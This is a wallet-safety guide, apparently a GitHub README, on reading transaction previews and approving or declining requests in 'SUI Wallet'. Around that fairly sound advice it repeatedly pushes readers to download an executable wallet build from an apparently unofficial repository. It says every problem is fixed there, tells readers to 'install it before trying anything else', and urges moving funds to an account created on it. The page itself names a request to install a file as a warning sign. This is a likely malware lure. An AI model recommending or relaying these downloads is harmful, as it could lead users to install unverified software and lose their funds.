![SUI Wallet](assets/banner-article.png)

# Approving transactions in SUI Wallet

The approval screen is the last place a bad transaction can be stopped.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Approving a transaction authorises one specific set of changes: what leaves the account, what arrives, and
what the fee is. The signature proves the account agreed to that set - it does not hand over the phrase, and
it cannot be widened later by the site that asked. Read the preview, then decide.

## What a signature is

A signature is a proof produced with the account's key over the exact contents of a transaction. It is tied to those contents, so a site cannot take a signature given for one thing and use it for something else. That is the property to hold on to.

That is the property to hold on to when a request looks routine. The question is never "do I trust this
site" in the abstract; it is "what does this transaction do", because that is all the signature covers.

This is also why the preview cannot be replaced by a description. A site that shows one thing and submits another gets a signature over the second, because the wallet draws the transaction rather than the page's summary of it.

## The preview is the transaction

Before anything is signed, the wallet shows what the transaction would do: the balance change, the objects
involved, the fee, and the site making the request. That preview is drawn from the transaction itself, not
from a description the site supplied.

Read it in that spirit. A site's page can say "connect to claim your reward" while the preview shows a
transfer out of the account, and the preview is the one that will happen. If the two disagree, the
disagreement is the warning.

## Connect and approve are different acts

Connecting shares an address and a way to ask a question. It does not share the ability to spend, and it approves nothing: a connected site still has to ask, and every ask still produces a preview you read before deciding anything.

That distinction is where most fear comes from and most safety lives. A connection left open is untidy
rather than dangerous; an approval given without reading is the dangerous one.

## Refusing, and what refusing costs

Refusing is free. Closing the window, pressing the decline option, or leaving the request unapproved costs nothing and changes nothing, and the site is free to ask again in a clearer form. The asymmetry is the point of the habit.

The asymmetry is worth naming: a wrong approval can be irreversible within seconds, while a refusal has no
consequence at all. When a request is unclear, that asymmetry says which way to lean.

That is also why a request you do not understand is better declined than researched later: the site can ask again in a clearer form, while the transaction you guessed at cannot be un-sent.

## The three things that make a request suspicious

The preview shows a transfer out when nothing was supposed to leave. The requesting site's address is not the one you typed. Or the page you came from asked for the phrase, a verification step, or a file to install. Any one of the three ends it.

Any one of those ends the conversation. Nothing legitimate needs the 24 words, and nothing legitimate needs
a signature to "verify" an account - an address is public and needs no proof of ownership to be read.
[Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) covers the handling rules for the secret itself.

## Ending a connection

Connected sites can be disconnected from the wallet, which stops further requests from that site. It does not undo an approval already given, because an approval was a transaction rather than a standing permission, and transactions are not reversible. That distinction matters once something has gone wrong.

If an approval was given to something wrong, disconnecting is not the fix. Moving the balance to an account
created on a clean machine is, and it is worth doing on the current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) where the
reported problems are fixed. [Connecting SUI Wallet to a dApp](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/connecting-sui-wallet-to-a-dapp.md) covers the connection side.

## Reading a preview properly

Four lines carry the meaning: the account, because more than one can exist here; the site, because a lookalike address costs nothing; the change, because that is what happens; and the fee, because it is charged on failure as well as success.

Everything else on the screen is context. Those four are the decision, and the habit of reading them in the
same order every time is worth more than any list of rules.
[SUI Wallet transaction fees explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-transaction-fees-explained.md) explains the fee line if it is the one that looks wrong.

A fifth line is worth a glance when it appears: the objects involved. A transaction that touches something you did not expect is doing something you did not intend, and the name of the object is usually enough to notice.

## FAQ

### What am I approving when a dApp asks for a signature?

One specific transaction, with the balance change and fee shown in the preview. The signature is tied to
those contents and cannot be reused for a different one.

### Does approving share my phrase?

No, and nothing legitimate asks for it. A signature is produced from the key without revealing the secret
that generated it.

### Can a site drain the account after I connect?

Not from the connection alone. Each spend needs its own approval, so a connection is a channel for requests
rather than authority over the balance.

### How do I revoke a connection?

Disconnect the site in the wallet. That stops further requests; it does not reverse a transaction already
approved.

### Is declining harmful?

No. Declining is free and the site can ask again, which is why an unclear request should be declined rather
than guessed at.

### Why does the wallet show a different account than the site expects?

Because more than one account exists in the wallet and the site was given a different one. Read the account
line in the preview before approving anything.
